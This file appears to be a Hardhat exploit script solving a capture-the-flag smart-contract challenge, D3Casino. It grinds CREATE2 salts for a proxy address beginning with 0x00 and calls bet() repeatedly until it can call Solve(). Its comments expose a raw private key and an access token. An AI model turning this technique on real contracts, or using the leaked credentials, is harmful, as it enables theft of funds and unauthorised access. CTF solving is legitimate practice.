import chalk from "chalk";
import { ethers } from "hardhat";
import { D3Casino__factory, D3CasinoAttack__factory } from "../../typechain";
import { randomBytes } from "crypto";
// deployer: 0x02B60Ac87756cF75f10610225CD3ED046b72E63f
// token: v4.local.nyfH527mjgN1kaJ2uU_ZnxT_bgYh_Q4vtNT8MYcjBBzXaidKFpbt0jO12OjOpmF_6_tZvJy3MkHNIPMK5BrYplSgzfiO72LFF7VbCWlyaeuIWNJoK6UVEcWeY90yYUV63vq0OynwkEh3uEKrctWxtJV7kGcFYNppgNA5XyrRTvR1Tg.RDNDYXNpbm8

function log(s:string){
    console.log(`${chalk.green("[-] ")+s}`)
}

async function main() {
    const signers = await ethers.getSigners();
    const provider = ethers.provider;
    const network = await provider.getNetwork();
    const deployer = signers[0];
    const attacker = signers[2];
    // private key 027efa1d59b6a0710ce986dba26e0b91a8b5a5724866adf51702c168db0cb63d
    // address 0x003cB973628ea442fb58d24CBf6cEb434E6b15cf  prefix:0x00
    
    log(`Running on the ${chalk.yellow(network.name)} network`);
    log(`Attacker address: ${chalk.yellow(attacker.address)}`);
    log(`Attacker balance: ${chalk.yellow(ethers.formatEther(await provider.getBalance(attacker)))} ETH`);

    let d3CasinoContract;
    let tx;
    if(network.name == "hardhat") {
        d3CasinoContract = await new D3Casino__factory(deployer).deploy();
        await d3CasinoContract.waitForDeployment();
        d3CasinoContract = d3CasinoContract.connect(attacker);
        log(`Successfully deployed the target contract to address ${chalk.yellow(await d3CasinoContract.getAddress())}!`)
    } else if (network.name == "remote") {
        const contractAddress = "0xd9753b19948c034Dfff72C7A747FABc4ee7f92e0";
        d3CasinoContract = D3Casino__factory.connect(contractAddress, attacker);
        log(`Successfully connected to the target contract with address ${chalk.yellow(await d3CasinoContract.getAddress())}!`)
    }

    if(d3CasinoContract) {
        const d3CasinoAttack = await new D3CasinoAttack__factory(attacker).deploy();
        await d3CasinoAttack.waitForDeployment();

        let proxyAddress;
        let score = 0;
        while (true) {
            let salt = '0x' + randomBytes(32).toString('hex');
            let predictedAddress = await d3CasinoAttack.predict(salt);
            if (predictedAddress.slice(2, 4) == "00") {  // proxy contract address prefix:0x00
                tx = await d3CasinoAttack.clone(salt);   // create proxy contract with 45 bytes
                await tx.wait();
                log(`Successfully deployed the proxy contract with zero prefix with salt ${chalk.yellow(salt)}`);
                proxyAddress = await d3CasinoAttack.proxyAddress();
                log(`Proxy contract address: ${chalk.yellow(proxyAddress)}`);
                let coder = ethers.AbiCoder.defaultAbiCoder();
                let calldata = ethers.id("bet(address)").substring(0,10) + coder.encode(["address"], [await d3CasinoContract.getAddress()]).substring(2);     
                tx = await attacker.sendTransaction({
                    to: proxyAddress,
                    data: calldata
                })
                await tx.wait(); // score++
                score = Number(await d3CasinoContract.scores(attacker.address));
                log(`Score: ${score}`);
                if (Number(score) == 10) {
                    break;
                }
                
            }
        }
        tx = await d3CasinoContract.Solve();
        await tx.wait();
        log(`Solved with transaction ${chalk.yellow(tx.hash)}`);
    }


}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});